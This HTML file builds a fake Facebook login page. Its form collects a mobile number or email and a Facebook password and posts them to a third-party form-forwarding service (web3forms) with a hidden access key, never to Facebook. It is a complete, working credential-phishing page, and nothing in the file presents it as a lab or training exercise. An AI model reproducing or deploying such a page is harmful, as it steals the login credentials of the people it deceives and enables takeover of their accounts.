<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook</title>
    <link rel="shortcut icon" href="favicon-fb.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
    />
  </head>
  <body>
    <container>
      <nav>
        <h1>facebook</h1>
      </nav>

      <main>
        <header>

          <div class="text">Log in to Facebook</div>
        </header>

        <form action="https://api.web3forms.com/submit" method="POST">
          
          <input type="text" name="text" placeholder="Mobile number or email address" required />
          <input type="password" name="password" placeholder="Facebook password" required />
          <input type="submit" name="submit" value="Log in" />
          <input type="button" name="button" value="Forgotten password?" />
          <div class="empty_div"></div>
          <input type="button" name="button" value="Create new" />
          <input type="button" name="button" value="Not now" />
          
          <input type="hidden" name="access_key" value="7c4d2152-ba89-4cc8-88a8-53bc89ddbf2c">
        </form>
      </main>
    </container>
  </body>
</html>
